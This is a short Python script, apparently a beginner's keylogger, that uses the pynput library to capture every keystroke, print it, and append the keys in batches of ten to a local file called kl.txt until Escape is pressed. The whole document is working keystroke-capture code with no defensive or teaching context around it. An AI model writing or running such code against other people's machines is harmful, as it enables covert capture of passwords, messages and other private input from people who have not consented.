import pynput
from pynput.keyboard import Key,Listener

keys = []
count = 0

def on_press(key):
    global count,keys
    print(f"{key} is pressed")
    keys.append(key)
    count += 1
    if count>=10:
        count = 0  
        write(keys) 
        keys = [] 

def write(keys):
    with open("kl.txt","a") as f:
        for i in keys:
            a = str(i).replace("'","")
            f.write(a)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()